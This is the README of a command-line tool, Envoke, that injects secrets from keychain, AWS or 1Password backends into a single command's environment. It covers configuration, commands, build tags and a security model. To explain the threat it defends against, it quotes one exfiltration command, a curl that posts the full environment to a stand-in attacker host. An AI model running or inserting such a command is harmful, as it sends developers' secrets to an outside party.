# Envoke (`ee`)

Inject secrets per-command from pluggable backends. Nothing persists. Nothing leaks.

```
$ ee -- make dev
$ ee -- psql -h $DB_HOST -U $DB_USER
$ ee -- aider --model claude-sonnet-4-6
$ ee myns -- printenv          # envchain-style: inject one keychain namespace
```

Envoke reads a project dotfile (`.envoke`), fetches the required secrets from one or more configured backends, and spawns your command as a subprocess with those secrets in its environment. The subprocess exits; the secrets vanish.

---

## Why

`.env` files get committed. `.env.example` goes stale. Every developer has a different setup. Secrets loaded globally into the shell environment are readable by every process — including every `postinstall` script in your `node_modules`.

Envoke addresses this by making secret injection **per-command, not ambient**. A malicious `postinstall` script that runs `curl attacker.com -d "$(env)"` gets nothing useful, because the secrets were never in the environment to begin with.

The `.envoke` dotfile is committed to git. It contains no secrets — only the *shape* of the environment: which namespaces are needed and which backend holds them. New developers clone the repo, run `ee -- make dev`, and it works. The secret surface is auditable in pull requests.

---

## Installation

### Download a release

Pre-built binaries for macOS, Linux, and Windows are available on the [releases page](https://git.dries.info/gerco/Envoke/releases).

### Build from source

```bash
# All backends (~35MB)
go build -tags "1password,keeper,jumpcloud,aws" -o ee ./cmd/ee

# Minimal build — keychain only (~7.6MB)
go build -o ee ./cmd/ee

# Specific backends
go build -tags "aws,1password" -o ee ./cmd/ee
```

Or use `just`:

```bash
just build              # builds with all backends
just build-minimal      # keychain only
just build-with aws,1password
```

See [Building](#building) for details on build tags.

---

## Quick Start

**1. Store a secret in the local keychain:**

```bash
ee set db-local DB_PASSWORD          # prompts for value (hidden)
ee set db-local DB_HOST                # prompts for value
```

The `keychain` backend uses your OS credential store and is always available without configuration.

**2. Run a command with secrets injected:**

```bash
ee -- psql -h $DB_HOST -U myuser
```

Envoke walks up from the current directory looking for `.envoke`. The first `.envoke` it finds determines the project root.

---

## Configuration

Configuration is split across three layers, merged in order:

```
<global config>     ← your backends, your credentials  (never committed)
<project>/.envoke               ← what this project needs           (committed to git)
<project>/.envoke.local         ← your personal overrides           (gitignored)
```

On Windows the global config lives at `%APPDATA%\envoke\config.yaml`. On macOS, `~/Library/Application Support/envoke/config.yaml`. On Linux, `$XDG_CONFIG_HOME/envoke/config.yaml`, defaulting to `~/.config/envoke/config.yaml`.

### Global config

Describes how to reach each backend. This file is never committed. Use `ee config edit` to open it in your editor.

```yaml
backends:
  aws-dev:
    type: aws
    region: us-east-1
    prefix: myteam-dev/
  aws-prod:
    type: aws
    region: us-east-1
    prefix: myteam-prod/
  op-service:
    type: 1password
    token: ops_...
```

Each backend entry has:

| Field | Description |
|-------|-------------|
| map key | The backend name (e.g. `aws-dev`) — referenced as `backend:` in `.envoke` |
| `type` | Backend type: `aws`, `1password`, `keeper`, `jumpcloud`, or `keychain` |
| additional keys | Backend-specific options inline alongside `type` (see [Backends](#backends)) |

You can also disable implicit (zero-config) backends that you don't want to use:

```yaml
disabled_implicit_backends:
  - keychain
  - aws
```

### Project dotfile (`.envoke`)

Committed to git. Describes which namespaces this project needs and which backend holds them.

```yaml
namespaces:
  - name: db-dev
    backend: aws-dev
  - name: local-creds
    backend: keychain
  - name: stripe
    backend: aws-dev
```

Namespaces are processed in order — earlier entries run first. This matters for backend chaining: if one namespace injects credentials that a later backend needs (e.g. AWS credentials fetched from the keychain before querying AWS Secrets Manager), declare the credential-provider namespace first.

Each namespace entry has:

| Field | Description |
|-------|-------------|
| `name` | The namespace identifier (e.g. `db-dev`) — also the secret group name in the backend |
| `backend` | Must match a backend name in the global config or be an implicit backend |
| `options` | Optional map: override backend options for this namespace only |

### Local overrides (`.envoke.local`)

Same format as `.envoke`. A namespace with the same `name` replaces the base entry **in its original position** (chaining order is preserved); new namespaces are appended. Add `.envoke.local` to `.gitignore`.

```yaml
# Override the db-dev namespace to use a local keychain instead of AWS
namespaces:
  - name: db-dev
    backend: keychain
```

---

## Backends

### Keychain (OS native)

**Build tag:** none (always compiled in)  
**Platforms:** macOS (Keychain), Windows (Credential Manager), Linux (Secret Service / GNOME Keyring / KWallet)

Uses the OS credential store. No extra config required — the `keychain` backend is always available as a zero-config implicit backend.

### AWS Secrets Manager

**Build tag:** `aws`

Stores all keys in a namespace as a single JSON object in one AWS secret. This minimises API calls and cost.

```yaml
backends:
  aws-dev:
    type: aws
    region: us-east-1
    prefix: myteam/
```

| Option | Description |
|--------|-------------|
| `region` | AWS region. Overrides the region from your AWS credentials/environment. |
| `prefix` | Prepended to the namespace name to form the secret name. For example, `prefix: myteam/` and namespace `db-dev` → secret name `myteam/db-dev`. |

AWS credentials are resolved using the standard AWS SDK credential chain: environment variables, `~/.aws/credentials`, IAM instance profiles, etc.

### 1Password Secrets Manager

**Build tag:** `1password`

Uses a 1Password service account token. The service account must have read access to the relevant vaults. Write operations are not supported (service accounts are read-only).

```yaml
backends:
  op-service:
    type: 1password
    token: ops_...
```

| Option | Description |
|--------|-------------|
| `token` | Service account token. Can also be set via the `OP_SERVICE_ACCOUNT_TOKEN` environment variable. |

**Key format:** Keys in a 1Password namespace map to items as `item` or `item/field`. The default field is `password`.

```bash
# Fetches the "password" field of the item named "myapp" in the vault
ee -- myapp

# Fetches a specific field
ee -- myapp/api_key
```

Storage model: namespace = vault name, key = item name (optionally with `/field`).

### Keeper Secrets Manager

**Build tag:** `keeper`

Stub implementation — not yet available.

### JumpCloud Password Manager

**Build tag:** `jumpcloud`

Stub implementation — not yet available.

---

## Commands

### `ee -- <command> [args...]`

Run a command with all secrets from `.envoke` injected into its environment.

```bash
ee -- make dev
ee -- npm start
ee -- psql -h $DB_HOST -U $DB_USER mydb
ee -- aider --model claude-sonnet-4-6
```

The current environment is preserved as a base layer. Secrets are layered on top, overriding any matching variable names. The exit code of the subprocess is passed through.

### `ee <namespace> -- <command> [args...]`

Inject secrets from a single OS keychain namespace without a `.envoke` file. This is a drop-in replacement for `envchain`:

```bash
ee db-local -- psql -h $DB_HOST -U $DB_USER mydb
ee aws-dev -- aws s3 ls
ee stripe -- node scripts/charge.js
```

The named namespace is looked up in the OS keychain backend (Keychain on macOS, Credential Manager on Windows, Secret Service on Linux). No global config or dotfile is required — useful for one-off commands and personal machines.

### `ee set <namespace> <key> [value]`

Store a secret in a backend namespace.

```bash
ee set db-local DB_PASSWORD           # prompts for value (echo hidden)
ee set db-local DB_HOST               # prompts for value

echo "s3cr3t" | ee set db-local DB_PASSWORD   # read from stdin
ee set db-local DB_PASSWORD mypassword        # value as argument (appears in shell history — avoid)

ee set --backend aws-dev db-dev DB_PASSWORD   # use a specific backend
```

If the namespace is not yet in `.envoke`, it is added automatically.

**Flags:**

| Flag | Description |
|------|-------------|
| `--backend <name>` | Use a specific backend, bypassing namespace lookup |

### `ee list [namespace]`

List secret keys. Values are never shown.

```bash
ee list                            # all keys from all namespaces in .envoke
ee list db-dev                     # keys from one namespace (keychain if not in .envoke)
ee list myns --backend aws-dev     # keys from myns using a specific backend
```

With no argument, all namespaces declared in `.envoke` are listed. With a namespace argument, the backend is resolved from the dotfile; if the namespace is not declared, the OS keychain is used as the default.

**Flags:**

| Flag | Description |
|------|-------------|
| `--backend <name>` | Use a specific backend, bypassing namespace lookup |

### `ee status`

Show the health and availability of all backends and project namespaces.

```
Backends:
NAME       KIND       DETAIL
────       ────       ──────
aws        implicit   enabled
keychain   implicit   enabled

Project namespaces:
NAMESPACE   BACKEND    STATUS
─────────   ───────    ──────
db-dev      aws-dev    ✓ ok
local       keychain   ✓ ok
```

### `ee config`

Manage the global configuration file.

```bash
ee config path          # print the config file path
ee config edit          # open in your default editor
ee config show          # display (sensitive values are redacted)
```

### `ee backend`

Manage backends in the global config.

```bash
ee backend list                    # list all backends (implicit and explicit)
ee backend enable keychain         # enable a disabled implicit backend
ee backend disable aws             # disable an implicit backend
ee backend add prod-aws --type aws --set region=us-west-2
ee backend edit prod-aws --set region=eu-west-1
ee backend remove prod-aws         # remove an explicit backend
```

---

## Building

Backends use Go build tags for optional compilation. Only include the backends you need.

The keychain backend is always included — no build tag needed.

| Tag | Backend | Notes |
|-----|---------|-------|
| `aws` | AWS Secrets Manager | ~5MB overhead |
| `1password` | 1Password Secrets Manager | ~19MB overhead |
| `keeper` | Keeper Secrets Manager | Stub — not yet implemented |
| `jumpcloud` | JumpCloud Password Manager | Stub — not yet implemented |

```bash
# All backends
go build -tags "1password,keeper,jumpcloud,aws" -o ee ./cmd/ee

# Minimal — keychain only (~7.6MB)
go build -o ee ./cmd/ee

# Using justfile
just build              # all backends
just build-minimal      # keychain only
just build-with aws,1password
```

---

## macOS Code Signing

On macOS, binaries that access the keychain must be code-signed to avoid repeated permission prompts from the OS.

### Development (self-signed certificate)

1. Open **Keychain Access** (`/Applications/Utilities/Keychain Access.app`)
2. Go to **Keychain Access > Certificate Assistant > Create Certificate...**
3. Fill in:
   - **Name**: `envoke-dev`
   - **Identity Type**: Self Signed Root
   - **Certificate Type**: Code Signing
4. Click **Create**, then **Continue**
5. Double-click the new certificate, expand **Trust**, set **Code Signing** to **Always Trust**, close (admin password required)

Then build and sign:

```bash
just develop      # build + sign with self-signed cert
just sign-dev     # sign an existing binary
```

### Distribution (Developer ID)

```bash
just sign-release
```

Requires an Apple Developer account, a Developer ID Application certificate, and a notarytool profile configured in Keychain.

---

## Security Model

Secrets exist only in the environment of the subprocess spawned by `ee`. They are not written to disk, not exported into the parent shell, and not visible to other processes.

**Supply chain:** A malicious `postinstall` script that exfiltrates `$(env)` captures nothing, because secrets were never in the ambient environment.

**Agent isolation:** AI coding agents (`aider`, `claude`, etc.) can be invoked via `ee`. They read secrets from `$ENV_VAR` like any other program, but never authenticate directly to Keeper, AWS, or 1Password. The blast radius of a compromised agent is limited to the process lifetime.

**Backend authentication:** Each backend inherits whatever authentication the backend enforces — Touch ID, Face ID, MFA, hardware tokens. Envoke does not weaken this.
